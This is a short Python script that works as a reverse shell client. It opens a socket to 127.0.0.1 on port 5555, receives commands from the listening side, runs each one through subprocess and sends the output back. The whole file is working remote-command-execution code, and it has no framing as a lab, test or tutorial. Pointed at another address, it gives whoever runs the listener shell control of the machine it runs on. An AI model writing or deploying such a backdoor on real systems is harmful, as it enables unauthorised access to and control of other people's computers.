import socket
import os
import threading
import subprocess

s = socket.socket()
s.connect(("127.0.0.1", 5555))

while True:
    data = s.recv(1024).decode().strip()  # Strip whitespace
    if not data:
        break

    # Split the command into a list, ignoring any leading/trailing whitespace
    command = data.split()
    
    try:
        # Execute the command
        result = subprocess.run(command, capture_output=True, text=True)
        # Get output; prefer stdout, fall back to stderr if empty
        output = result.stdout if result.stdout else result.stderr
    except Exception as e:
        output = str(e)

    # Send the output back to the server
    s.sendall(output.encode("UTF-8"))

s.close()
